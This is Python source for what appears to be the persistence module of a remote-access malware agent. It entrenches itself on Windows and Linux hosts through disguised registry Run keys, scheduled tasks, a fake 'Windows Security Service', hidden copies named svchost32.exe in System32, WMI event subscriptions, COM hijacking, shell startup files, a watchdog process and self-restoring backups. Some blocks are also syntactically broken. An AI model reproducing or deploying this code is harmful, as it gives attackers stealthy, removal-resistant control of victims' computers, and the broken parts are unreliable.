"""
Persistence module
Handles various persistence mechanisms to ensure the agent survives reboots
"""

import os
import subprocess
import tempfile
import shutil
from logging_utils import log_message
from dependencies import WINDOWS_AVAILABLE
from uac_bypass import is_admin

def establish_persistence():
    """Establish multiple persistence mechanisms with advanced tamper protection."""
    if not WINDOWS_AVAILABLE:
        return establish_linux_persistence()
    
    persistence_methods = [
        registry_run_key_persistence,
        startup_folder_persistence,
        scheduled_task_persistence,
        service_persistence,
        system_level_persistence,
        wmi_event_persistence,
        com_hijacking_persistence,
    ]
    
    success_count = 0
    for method in persistence_methods:
        try:
            if method():
                success_count += 1
        except Exception as e:
            log_message(f"Persistence method {method.__name__} failed: {e}")
            continue
    
    return success_count > 0

def registry_run_key_persistence():
    """Establish persistence via registry Run keys."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
        
        # Multiple registry locations for persistence
        run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        
        value_name = "WindowsSecurityUpdate"
        success_count = 0
        
        for hkey, key_path in run_keys:
            try:
                log_message(f"[REGISTRY] Attempting to create key: {key_path}")
                key = winreg.CreateKey(hkey, key_path)
                log_message(f"[REGISTRY] Key created successfully: {key_path}")
                
                log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                log_message(f"[REGISTRY] Value set successfully in {key_path}")
                
                winreg.CloseKey(key)
                success_count += 1
                
            except PermissionError as e:
                log_message(f"[REGISTRY] Permission denied for {key_path}: {e}")
                continue
            except Exception as e:
                log_message(f"[REGISTRY] Failed to set key {key_path}: {e}")
                continue
        
        log_message(f"[REGISTRY] Registry persistence setup completed. Success: {success_count}/{len(run_keys)} keys")
        return success_count > 0
        
    except Exception as e:
        log_message(f"[REGISTRY] Registry persistence failed: {e}")
        return False

def startup_folder_persistence():
    """Establish persistence via startup folder."""
    try:
        # Get startup folder path
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        
        # Check if startup folder exists and is writable
        if not os.path.exists(startup_folder):
            log_message(f"[WARN] Startup folder does not exist: {startup_folder}")
            return False
        
        if not os.access(startup_folder, os.W_OK):
            log_message(f"[WARN] No write permission to startup folder: {startup_folder}")
            return False
        
        current_exe = os.path.abspath(__file__)
        
        if current_exe.endswith('.py'):
            # Create batch file wrapper with better error handling
            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
            batch_path = os.path.join(startup_folder, "SystemService.bat")
            
            try:
                with open(batch_path, 'w') as f:
                    f.write(batch_content)
                log_message(f"[OK] Startup folder entry created: {batch_path}")
                return True
            except PermissionError:
                log_message(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
                return False
            except Exception as e:
                log_message(f"[WARN] Error creating startup folder entry: {e}")
                return False
        
        return True
        
    except Exception as e:
        log_message(f"[WARN] Startup folder persistence failed: {e}")
        return False

def scheduled_task_persistence():
    """Establish persistence via scheduled tasks."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create scheduled task using schtasks command
        subprocess.run([
            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        log_message(f"Scheduled task persistence failed: {e}")
        return False

def service_persistence():
    """Establish persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', 'WindowsSecurityService',
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        log_message(f"Service persistence failed: {e}")
        return False

def establish_linux_persistence():
    """Establish persistence on Linux systems."""
    try:
        current_exe = os.path.abspath(__file__)
        
        # Method 1: .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System update check\npython3 {current_exe} &\n")
            except Exception:
                pass
        
        return True
        
    except Exception as e:
        log_message(f"Linux persistence failed: {e}")
        return False

def system_level_persistence():
    """Install script to protected system directories with SYSTEM-level protection."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Protected system directories
        system_dirs = [
            r"C:\Windows\System32\svchost32.exe",
            r"C:\Windows\SysWOW64\svchost32.exe",
            r"C:\Windows\System32\drivers\svchost32.exe",
        ]
        
        # Check if we're running as admin before attempting system-level persistence
        if not is_admin():
            log_message("[WARN] System-level persistence requires admin privileges", "warning")
            return False
        
        success_count = 0
        for target_path in system_dirs:
            try:
                # Copy current executable to system directory
                shutil.copy2(current_exe, target_path)
                
                # Set file attributes to system/hidden/readonly
                subprocess.run([
                    'attrib.exe', '+S', '+H', '+R', target_path
                ], creationflags=subprocess.CREATE_NO_WINDOW)
                
                success_count += 1
                
            except Exception as e:
                log_message(f"Failed to install to {target_path}: {e}")
                continue
        
        return success_count > 0
        
    except Exception as e:
        log_message(f"System-level persistence failed: {e}")
        return False

def wmi_event_persistence():
    """Install WMI event-based persistence."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # WMI event subscription for persistence
        wmi_script = f'''
        $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\cimv2" -Arguments @{{
            Name = "SystemBootEvent";
            EventNameSpace = "root\\cimv2";
            QueryLanguage = "WQL";
            Query = "SELECT * FROM Win32_SystemConfigurationChangeEvent"
        }}
        
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\cimv2" -Arguments @{{
            Name = "SystemBootConsumer";
            CommandLineTemplate = "{current_exe}"
        }}
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\cimv2" -Arguments @{{
            Filter = $filter;
            Consumer = $consumer
        }}
        '''
        
        # Execute PowerShell script
        subprocess.run([
            'powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', wmi_script
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        log_message(f"WMI event persistence failed: {e}")
        return False

def com_hijacking_persistence():
    """Install COM object hijacking persistence."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # COM hijacking through CLSID registry entries
        clsid = "{B54F3741-5B07-11CF-A4B0-00AA004A55E8}"
        key_path = rf"Software\Classes\CLSID\{clsid}\InprocServer32"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        log_message(f"COM hijacking persistence failed: {e}")
        return False

def file_locking_persistence():
    """Create file locking persistence mechanism."""
    try:
        current_exe = os.path.abspath(__file__)
        lock_file = current_exe + ".lock"
        
        with open(lock_file, 'w') as f:
            f.write(str(os.getpid()))
        
        return True
        
    except Exception as e:
        log_message(f"File locking persistence failed: {e}")
        return False

def monitor_main_script():
    """Monitor the main script file for deletion and restore it."""
    import threading
    import time
    
    def monitor_thread():
        current_exe = os.path.abspath(__file__)
        while True:
            time.sleep(10)
            if not os.path.exists(current_exe):
                try:
                    # Restore the script from backup
                    backup_path = current_exe + ".bak"
                    if os.path.exists(backup_path):
                        shutil.copy2(backup_path, current_exe)
                        log_message("Main script restored from backup")
                except Exception as e:
                    log_message(f"Failed to restore main script: {e}")
    
    thread = threading.Thread(target=monitor_thread, daemon=True)
    thread.start()
    return True

def watchdog_persistence():
    """Install watchdog process that monitors and restarts the main process."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        watchdog_script = f'''
import os
import subprocess
import time
import sys

def is_process_running(process_name):
    try:
        subprocess.check_output(f"tasklist /FI \\"IMAGENAME eq {{process_name}}\\"", shell=True)
        return True
    except:
        return False

while True:
    if not is_process_running("python.exe"):
        try:
            subprocess.Popen(["{current_exe}"], shell=True)
            except Exception:
                pass
    time.sleep(30)
'''
        
        watchdog_path = os.path.join(tempfile.gettempdir(), "system_watchdog.py")
        with open(watchdog_path, 'w') as f:
            f.write(watchdog_script)
        
        # Start watchdog process
        subprocess.Popen([
            'python.exe', watchdog_path
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        log_message(f"Watchdog persistence failed: {e}")
        return False

def tamper_protection_persistence():
    """Install tamper protection mechanisms."""
    try:
        # File integrity monitoring
        current_exe = os.path.abspath(__file__)
        
        # Create backup copy
        backup_path = current_exe + ".bak"
        shutil.copy2(current_exe, backup_path)
        
        # Set file attributes
        if WINDOWS_AVAILABLE:
            subprocess.run([
                'attrib.exe', '+S', '+H', backup_path
            ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        log_message(f"Tamper protection persistence failed: {e}")
        return False

def check_and_restore():
    """Check persistence mechanisms and restore if needed."""
    try:
        # Check registry persistence
        if not check_registry_persistence():
            registry_run_key_persistence()
        
        # Check startup folder persistence
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        batch_path = os.path.join(startup_folder, "SystemService.bat")
        if not os.path.exists(batch_path):
            startup_folder_persistence()
        
        return True
        
    except Exception as e:
        log_message(f"Check and restore failed: {e}")
        return False

def check_registry_persistence():
    """Check if registry persistence is still active."""
    try:
        import winreg
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "WindowsSecurityUpdate"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
            value, _ = winreg.QueryValueEx(key, value_name)
            winreg.CloseKey(key)
            return bool(value)
        except FileNotFoundError:
            return False
        
    except Exception:
        return False

def add_to_startup():
    """Add agent to system startup (cross-platform)."""
    try:
        if WINDOWS_AVAILABLE:
            return add_registry_startup() or add_startup_folder_entry()
        else:
            return add_linux_startup()
    except Exception as e:
        log_message(f"Failed to add to startup: {e}")
        return False

def add_registry_startup():
    """Add to Windows registry startup."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Try HKEY_CURRENT_USER first (doesn't require admin)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            log_message("Added to HKEY_CURRENT_USER startup")
            return True
        except Exception as e:
            log_message(f"Failed to add to HKEY_CURRENT_USER startup: {e}")
        
        # Try HKEY_LOCAL_MACHINE if admin (requires admin privileges)
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            log_message("Added to HKEY_LOCAL_MACHINE startup")
            return True
        except Exception as e:
            log_message(f"Failed to add to HKEY_LOCAL_MACHINE startup: {e}")
            
        return False
        
    except Exception as e:
        log_message(f"Registry startup failed: {e}")
        return False

def add_startup_folder_entry():
    """Add entry to Windows startup folder."""
    try:
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        
        if not os.path.exists(startup_folder):
            log_message(f"Startup folder does not exist: {startup_folder}")
            return False
        
        current_exe = os.path.abspath(__file__)
        
        if current_exe.endswith('.py'):
            # Create a batch file to run the Python script
            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
            batch_path = os.path.join(startup_folder, "SystemService.bat")
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            log_message(f"Added startup folder entry: {batch_path}")
            return True
        
        return False
        
    except Exception as e:
        log_message(f"Startup folder entry failed: {e}")
        return False

def add_linux_startup():
    """Add to Linux startup mechanisms."""
    try:
        current_exe = os.path.abspath(__file__)
        
        # Method 1: Add to .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            startup_line = f"\n# System security service\npython3 {current_exe} &\n"
            
            with open(bashrc_path, 'r') as f:
                content = f.read()
            
            if startup_line.strip() not in content:
                with open(bashrc_path, 'a') as f:
                    f.write(startup_line)
                log_message("Added to ~/.bashrc")
                return True
                
        except Exception as e:
            log_message(f"Failed to add to ~/.bashrc: {e}")
        
        # Method 2: Add to autostart (if desktop environment)
        try:
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            desktop_file = os.path.join(autostart_dir, "system-service.desktop")
            desktop_content = f"""[Desktop Entry]
Name=System Service
Exec=python3 {current_exe}
Type=Application
Hidden=false
X-GNOME-Autostart-enabled=true
"""
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            log_message(f"Added autostart entry: {desktop_file}")
            return True
            
        except Exception as e:
            log_message(f"Failed to add autostart entry: {e}")
        
        return False
        
    except Exception as e:
        log_message(f"Linux startup failed: {e}")
        return False

def setup_advanced_persistence():
    """Setup advanced persistence mechanisms with comprehensive protection."""
    log_message("Setting up advanced persistence mechanisms...")
    
    # Basic persistence
    basic_success = establish_persistence()
    
    # Advanced monitoring and protection
    if basic_success:
        # File monitoring
        monitor_main_script()
        
        # Tamper protection
        tamper_protection_persistence()
        
        # Watchdog process
        watchdog_persistence()
        
        log_message("Advanced persistence setup completed")
        return True
    else:
        log_message("Basic persistence setup failed")
        return False

def setup_persistence():
    """Main persistence setup function."""
    log_message("Initializing persistence mechanisms...")
    
    # Check if already persistent
    if check_registry_persistence():
        log_message("Persistence already established")
        return True
    
    # Setup persistence
    success = establish_persistence()
    
    if success:
        log_message("Persistence mechanisms established successfully")
        
        # Setup advanced protection
        setup_advanced_persistence()
        
        return True
    else:
        log_message("Failed to establish persistence", "warning")
        return False
